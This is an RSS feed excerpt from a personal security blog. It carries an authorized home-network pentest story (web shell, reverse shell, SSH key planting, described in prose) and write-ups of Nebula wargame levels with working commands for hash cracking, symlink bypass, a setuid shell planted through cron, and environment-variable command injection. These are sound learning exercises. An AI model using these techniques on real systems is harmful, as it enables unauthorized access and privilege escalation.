					<wfw:commentRss>/am-i-officially-a-white-hat-hacker-now/feed/</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>My first pentest on a friend&#8217;s network</title>
		<link>/my-first-pentest-on-a-friends-network/</link>
					<comments>/my-first-pentest-on-a-friends-network/#comments</comments>
		
		<dc:creator><![CDATA[Graeme Robinson]]></dc:creator>
		<pubDate>Sun, 06 Jan 2013 16:31:58 +0000</pubDate>
				<category><![CDATA[Exploit]]></category>
		<category><![CDATA[Information Security]]></category>
		<category><![CDATA[Lesson Learned]]></category>
		<category><![CDATA[OS X]]></category>
		<category><![CDATA[Penetration Test]]></category>
		<category><![CDATA[PHP]]></category>
		<category><![CDATA[Shell]]></category>
		<category><![CDATA[Unix]]></category>
		<category><![CDATA[Web Server]]></category>
		<category><![CDATA[WebApp]]></category>
		<guid isPermaLink="false">/?p=227</guid>

					<description><![CDATA[Someone I have know for a while was aware of my growing interest in information security and I had warned them a while ago that their network was probably vulnerable to attack because I had seen some web services that &#8230; <a href="/my-first-pentest-on-a-friends-network/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
										<content:encoded><![CDATA[<p>Someone I have know for a while was aware of my growing interest in information security and I had warned them a while ago that their network was probably vulnerable to attack because I had seen some web services that were not password protected running out of their home public IP address.</p>
<p>I saw them over the Christmas/new year period and they gave me permission to try and penetrate their network, specifically they challenged me to change the root password on their unRAID server.</p>
<p>I started off by firing up my Backtrack 5r3 VM and updating everything before registering Nessus and performing a scan of his public IP address.</p>
<p>Nessus didn&#8217;t find anything that was listed as critical, but it did show me that we had ssh running on port 22 and it also showed me all other ports that were open and had web servers running on them. I checked them all out and I found on various ports; the default Lion server webpage, SABNZBd, SickBeard, Transmission, and the unRAID server.</p>
<p>The website served by the unRAID server was asking for a username and password using basic access authentication. That was no use so I started looking into the other services. Not only were the operating interfaces unsecured, but their configuration sections were also open to anyone. I saw that SABNZBd was running as &#8220;admin&#8221; and that it had an option of running scripts when a download had completed. The method was to point SABNZBd to a folder containing scripts, start a download and then choose what script to run on completion. I knew I could download a file using SABNZBd or Transmission to any directory that the admin user had write permissions to, but I didn&#8217;t know at this stage how to make it executable.</p>
<p>I saw in SABNZBd&#8217;s preferences that I could specify the permissions (in octal format) of files and folders that were downloaded, so I ran SABNZBd on my machine, created a binary post on a newsgroup containing a script that was basically a reverse shell and tested a download to my machine with SABNZBd set to mark everything at 777. It created a folder with 777 permissions, but the file was only 555. Presumably this was for security reasons &#8211; damn!</p>
<p>At this point I was wishing that his machine was running Windows not OSX because SABNZBd on Windows only requires that a scripts file extension is in the PATHEXT environment variable. That would have been much easier than getting a file marked as executable.</p>
<p>I had to find another way of making an executable script on that machine. How could I get that machine to run my commands without having an executable script set&#8230; The web server or course. I created my single line PHP shell again (mentioned in a previous post) and set Transmission to download files to the Lion web server default folder, created a torrent containing my php script and downloaded the torrent to the server using transmission. I tested it, with the command <strong>whoami</strong>, and it worked. I was in, but I was only the user _www.</p>
<p>What could I do as _www? Not much, but I was able to create a reverse shell using netcat and take a look around the system. I couldn&#8217;t access admin&#8217;s files yet, but of course I could write to /tmp. If I could write to /tmp, I could create a script and mark it as executable by everyone. Then I could get SABNZBd to run it! I started thinking about making a script that would create a reverse shell, then it dawned on me: create a public/private key pair and add it to /Users/admin/.ssh/authorized_keys.</p>
<p>I uploaded my public key using my php shell script, and then created an executable script in /tmp that appended my key to authorized_keys.</p>
<p>I started a new SABNZBd download (I decided to just download something that was small, free and released under the CC license) so as no to upset anyone. Obviously I now set my script to run. All went well and I could now ssh into the machine as the admin user without a password.</p>
<p>At this point I cleaned up everything I had downloaded and just left my key in place so I could log in. I took a look around, but I couldn&#8217;t see anything to do with the unRAID server, so I thought I should report how far I had got.</p>
<p>They were surprised, and while I didn&#8217;t get into the unRAID server, I had gotten a lot further than they thought anyone would be able to. As a result of this, they have since enabled logins on all their web services and removed my public key, but they still do have some vulnerabilities, like ssh running on a default port and allowing password authentication (ripe for brute forcing). They are a lot safer than they were, but it may well be worth me going back and having another go at some point in the future.</p>
<p>A lot of the methods that I have used in this test were inspired by the challenges I have been working through in hackthissite.org and exploit-excercises.com and I&#8217;m very grateful to them for making the challenges.</p>
<p>I&#8217;m tempted to try and create a VM with this vulnerable setup and release it. I would have to check the licences, but I think most of it could be done using open source solutions (linux, apache, sabnzbd, transmission)</p>
]]></content:encoded>
					
					<wfw:commentRss>/my-first-pentest-on-a-friends-network/feed/</wfw:commentRss>
			<slash:comments>9</slash:comments>
		
		
			</item>
		<item>
		<title>Exploit Exercises – Nebula – Level 06</title>
		<link>/exploit-exercises-nebula-level-06/</link>
					<comments>/exploit-exercises-nebula-level-06/#respond</comments>
		
		<dc:creator><![CDATA[Graeme Robinson]]></dc:creator>
		<pubDate>Thu, 29 Nov 2012 23:59:23 +0000</pubDate>
				<category><![CDATA[Brute Force]]></category>
		<category><![CDATA[Crack]]></category>
		<category><![CDATA[Exploit]]></category>
		<category><![CDATA[Exploit Excercises]]></category>
		<category><![CDATA[Hash]]></category>
		<category><![CDATA[Information Security]]></category>
		<category><![CDATA[John The Ripper]]></category>
		<category><![CDATA[Linux]]></category>
		<category><![CDATA[Shell]]></category>
		<category><![CDATA[Unix]]></category>
		<guid isPermaLink="false">/?p=215</guid>

					<description><![CDATA[Even less information about this one: The flag06 account credentials came from a legacy unix system. To do this level, log in as the level06 account with the password level06 . Files for this level can be found in /home/flag06. &#8230; <a href="/exploit-exercises-nebula-level-06/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
										<content:encoded><![CDATA[<p>Even less information about this one:</p>
<p style="padding-left: 30px;">The flag06 account credentials came from a legacy unix system.<br />
To do this level, log in as the level06 account with the password level06 . Files for this level can be found in /home/flag06.</p>
<p>I had a good idea what I&#8217;m looking for here, an easy to crack password hash in /etc/passwd rather than in the shadow file, so:</p>
<pre lang="Bash">cat /etc/passwd | grep flag06</pre>
<p>shows me the hash is ueqwOCnSGdsuM. I need to &#8220;crack&#8221; the hash. Time to get john the ripper on the case. At this point I didn&#8217;t have any other linux machines to hand, so I went to another tty session on this one and logged in a nebula and installed john (<strong>sudo apt-get install john</strong>). Then I ran john on the password file (<strong>john /etc/passwd</strong>) and he showed me the password. I switched over to flag06 account and the password worked as expected.</p>
]]></content:encoded>
					
					<wfw:commentRss>/exploit-exercises-nebula-level-06/feed/</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>Exploit Exercises – Nebula – Level 05</title>
		<link>/exploit-exercises-nebula-level-05/</link>
					<comments>/exploit-exercises-nebula-level-05/#respond</comments>
		
		<dc:creator><![CDATA[Graeme Robinson]]></dc:creator>
		<pubDate>Thu, 29 Nov 2012 23:44:00 +0000</pubDate>
				<category><![CDATA[Exploit]]></category>
		<category><![CDATA[Exploit Excercises]]></category>
		<category><![CDATA[Information Security]]></category>
		<category><![CDATA[Linux]]></category>
		<category><![CDATA[PHP]]></category>
		<category><![CDATA[Shell]]></category>
		<category><![CDATA[Unix]]></category>
		<guid isPermaLink="false">/?p=210</guid>

					<description><![CDATA[Not much information to start on this one: Check the flag05 home directory. You are looking for weak directory permissions To do this level, log in as the level05 account with the password level05 . Files for this level can be found in /home/flag05. The command &#8230; <a href="/exploit-exercises-nebula-level-05/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
										<content:encoded><![CDATA[<p>Not much information to start on this one:</p>
<p style="padding-left: 30px;">Check the <em>flag05</em> home directory. You are looking for weak directory permissions<br />
To do this level, log in as the <em>level05</em> account with the password <em>level05</em> . Files for this level can be found in /home/flag05.</p>
<p>The command <strong>ll</strong> (an alias for <strong>ls-alF</strong>) showed me that I had read access to ~flag05/.backup, and in there was a backup gzipped tar. Hopefully some goodies in here&#8230;</p>
<p>I unpacked the tar and found that it contained a folder called .ssh. This is used for secure shell authentication. That folder contained a private/public key pair and an authorized_keys file. The authorised_keys file is exactly the same as the public key file, so (assuming that the authorised_keys file had not been deleted since the backup) I should be able to ssh in using the private key, as long as it was not encrypted with a passphrase.</p>
<p>I copied the id_rsa file to ~/.ssh and tried to connect using:</p>
<pre lang="Bash">ssh flag05@localhost</pre>
<p>Bingo!</p>
]]></content:encoded>
					
					<wfw:commentRss>/exploit-exercises-nebula-level-05/feed/</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>Exploit Exercises – Nebula – Level 04</title>
		<link>/exploit-exercises-nebula-level-04/</link>
					<comments>/exploit-exercises-nebula-level-04/#respond</comments>
		
		<dc:creator><![CDATA[Graeme Robinson]]></dc:creator>
		<pubDate>Thu, 29 Nov 2012 23:28:27 +0000</pubDate>
				<category><![CDATA[Exploit]]></category>
		<category><![CDATA[Exploit Excercises]]></category>
		<category><![CDATA[Information Security]]></category>
		<category><![CDATA[Linux]]></category>
		<category><![CDATA[Penetration Test]]></category>
		<category><![CDATA[Shell]]></category>
		<category><![CDATA[Unix]]></category>
		<guid isPermaLink="false">/?p=206</guid>

					<description><![CDATA[The information about this level says: This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it 🙂 To do this level, log in as the level04 account with the &#8230; <a href="/exploit-exercises-nebula-level-04/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
										<content:encoded><![CDATA[<p>The information about this level says:</p>
<p style="padding-left: 30px;">This level requires you to read the <em>token</em> file, but the code restricts the files that can be read. Find a way to bypass it <img src="https://s.w.org/images/core/emoji/15.0.3/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /><br />
To do this level, log in as the <em>level04</em> account with the password <em>level04</em> . Files for this level can be found in /home/flag04.</p>
<p>It also contains some source code:</p>
<pre lang="C" line="1">
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>

int main(int argc, char **argv, char **envp)
{
    char buf[1024];
    int fd, rc;

    if(argc == 1) {
        printf("%s [file to read]\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    if(strstr(argv[1], "token") != NULL) {
        printf("You may not access '%s'\n", argv[1]);
        exit(EXIT_FAILURE);
    }

    fd = open(argv[1], O_RDONLY);
    if(fd == -1) {
        err(EXIT_FAILURE, "Unable to open %s", argv[1]);
    }

    rc = read(fd, buf, sizeof(buf));

    if(rc == -1) {
        err(EXIT_FAILURE, "Unable to read fd %d", fd);
    }

    write(1, buf, rc);
}
</pre>
<p>Its fairly clear from looking at the files and the source code (I will admit I had to use a lot of <strong>man</strong> to help me understand the source code) that I want to read the contents of &#8220;token&#8221;, but the program won&#8217;t allow it. I tried things like <strong>./token</strong> and <strong>../flag04/token</strong>, but that didn&#8217;t work because the program is just searching for the string &#8220;token&#8221; anywhere in the first argument. Well&#8230; how do I get the contents of that file &#8220;into&#8221; another file without having permission to read the file? Symbolic link! Here&#8217;s what I did:</p>
<pre lang="Bash" line="1">
ln -s ~flag04/token /tmp/link
~flag04/flag04 /tmp/link
</pre>
<p>It turns out that the contents of the token file is the password for the flag04 account so I just did su flag04 and used that password. I ran getflag and violà!</p>
]]></content:encoded>
					
					<wfw:commentRss>/exploit-exercises-nebula-level-04/feed/</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>Exploit Exercises – Nebula – Level 03</title>
		<link>/exploit-exercises-nebula-level-03/</link>
					<comments>/exploit-exercises-nebula-level-03/#comments</comments>
		
		<dc:creator><![CDATA[Graeme Robinson]]></dc:creator>
		<pubDate>Thu, 29 Nov 2012 23:10:15 +0000</pubDate>
				<category><![CDATA[Exploit]]></category>
		<category><![CDATA[Exploit Excercises]]></category>
		<category><![CDATA[Information Security]]></category>
		<category><![CDATA[Linux]]></category>
		<category><![CDATA[Penetration Test]]></category>
		<category><![CDATA[Shell]]></category>
		<category><![CDATA[Unix]]></category>
		<guid isPermaLink="false">/?p=198</guid>

					<description><![CDATA[The information about this level says: Check the home directory of flag03 and take note of the files there. There is a crontab that is called every couple of minutes. To do this level, log in as the level03 account with the password level03 . Files &#8230; <a href="/exploit-exercises-nebula-level-03/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
										<content:encoded><![CDATA[<p>The information about this level says:</p>
<p style="padding-left: 30px;">Check the home directory of <em>flag03</em> and take note of the files there.<br />
There is a crontab that is called every couple of minutes.<br />
To do this level, log in as the <em>level03</em> account with the password <em>level03</em> . Files for this level can be found in /home/flag03.</p>
<p>Well looking in ~flag03 there is just one directory (writable.d) file and one file (writable.sh). I&#8217;m assuming that the cron job runs writable.sh every couple of minutes so I looked at that script. I can see that the script runs every file in the writable.d folder (which we have write access to), but will kill the process if it takes longer than 5 seconds. It then removes the file.</p>
<p>What we could do is make a quick bash script that will run getflag and save the output like this:</p>
<pre lang="Bash" line="1">#!/bin/sh
getflag > /tmp/getflag.out</pre>
<p>Which works (after we wait for the cron job to run it), but I want shell! So we&#8217;re going to borrow a trick from level01 and create a program that will launch a bash shell and get flag03 to set the setuid bit.</p>
<p>My C program looks like this:</p>
<pre lang="C" line="1">
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

int main() {
    gid_t gid;
    uid_t uid;
    gid = getegid();
    uid = geteuid();

    setresgid(gid, id, gid);
    setresuid(uid, uid, uid);

    system("/bin/bash");
}
</pre>
<p>Now I just compile it with gcc and drop it in /tmp so that flag03 can access it. All I need the cron job to do now is make a copy and set the setuid bit, so here is the script I dropped in ~flag03/writable.d:</p>
<pre lang="bash" line="1">
#!/bin/sh
cp /tmp/setuidshell /tmp/setuidshell2
chmod u+s /tmp/setuidshell2
</pre>
<p>This got me a program (/tmp/setuidshell2) in that gave me shell. From here I was able to run <strong>getflag</strong>, and also to run <strong>crontab -l</strong> to see that the cron job is actually called every 3 minutes.</p>
]]></content:encoded>
					
					<wfw:commentRss>/exploit-exercises-nebula-level-03/feed/</wfw:commentRss>
			<slash:comments>5</slash:comments>
		
		
			</item>
		<item>
		<title>Exploit Exercises – Nebula – Level 02</title>
		<link>/exploit-exercises-nebula-level-02/</link>
					<comments>/exploit-exercises-nebula-level-02/#comments</comments>
		
		<dc:creator><![CDATA[Graeme Robinson]]></dc:creator>
		<pubDate>Thu, 29 Nov 2012 19:12:56 +0000</pubDate>
				<category><![CDATA[Exploit]]></category>
		<category><![CDATA[Exploit Excercises]]></category>
		<category><![CDATA[Information Security]]></category>
		<category><![CDATA[Linux]]></category>
		<category><![CDATA[Penetration Test]]></category>
		<category><![CDATA[Shell]]></category>
		<category><![CDATA[Unix]]></category>
		<guid isPermaLink="false">/?p=165</guid>

					<description><![CDATA[The information about this level says: There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it? To do this level, log in as the level02 account with the password level02 . Files for this level &#8230; <a href="/exploit-exercises-nebula-level-02/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
										<content:encoded><![CDATA[<p>The information about this level says:</p>
<p style="padding-left: 30px;">There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?<br />
To do this level, log in as the <em>level02</em> account with the password <em>level02</em> . Files for this level can be found in /home/flag02.</p>
<p>It also contains some source code:</p>
<pre lang="C" line="1">
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
    char *buffer;

    gid_t gid;
    uid_t uid;

    gid = getegid();
    uid = geteuid();

    setresgid(gid, gid, gid);
    setresuid(uid, uid, uid);

    buffer = NULL;

    asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
    printf("about to call system(\"%s\")\n", buffer);

    system(buffer);
}</pre>
<p>This is similar to the Level 01. An environment variable $USER is being used to construct a string that is printed to the screen before being run. If we can edit that environment variable, we can inject a malicious command.</p>
<p>Initially I changed $USER so that running the program would execute getflag. The command I used was:</p>
<pre lang="Bash">USER=;getflag;echo</pre>
<p>I&#8217;ll break this down:<br />
<strong>;</strong> &#8211; end the command and start a new one<br />
<strong>getflag</strong> &#8211; run the getflag program<br />
<strong>;</strong> &#8211; end the command and start a new one<br />
<strong>echo</strong> &#8211; start a new echo command so that the following arguments don&#8217;t cause an error</p>
<p>This results in the following command being run:</p>
<pre lang="Bash">/bin/echo ;getflag;echo is cool</pre>
<p>I got a success message from get flag, but I wanted shell, so I changed my command to:</p>
<pre lang="Bash">USER="Opening escalated shell...;bin/bash;echo Closing pwned shell, now that"</pre>
<p>This time I got shell, and some cool text when going into the shell and when coming out (after typing exit)</p>
]]></content:encoded>
					
					<wfw:commentRss>/exploit-exercises-nebula-level-02/feed/</wfw:commentRss>
			<slash:comments>3</slash:comments>
		
		
			</item>
	</channel>
</rss>
